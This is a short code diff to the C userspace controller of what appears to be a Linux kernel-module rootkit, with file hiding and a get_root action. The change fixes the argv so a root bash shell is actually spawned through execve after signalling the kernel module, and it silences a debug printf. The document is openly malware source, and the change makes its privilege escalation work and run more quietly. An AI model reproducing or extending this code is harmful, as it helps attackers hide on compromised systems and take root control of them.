@@ -8,6 +8,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <unistd.h>
 #include <sys/ipc.h>
 #include <sys/msg.h>
 #include <sys/types.h>
@@ -202,11 +203,11 @@ int communicate_with_lkm(action_task *rootkit_action) {
  */
 bool execute_action_if_possible(action_task *action) {
     if (action->func_code != -1) {
-        printf("Function code: %d, str: %s\n", action->func_code, action->file_hide_str);
+        // printf("Function code: %d, str: %s\n", action->func_code, action->file_hide_str);
         if (communicate_with_lkm(action) == 0) {
             if (action->func_code == functionCode.get_root) {
                 const char *bash = "/bin/bash";
-                char *const argv[3] = {SHELL, NULL};
+                char *const argv[3] = {bash, NULL};
                 char *const envp[1] = {NULL};
                 execve(bash, argv, envp);
             }
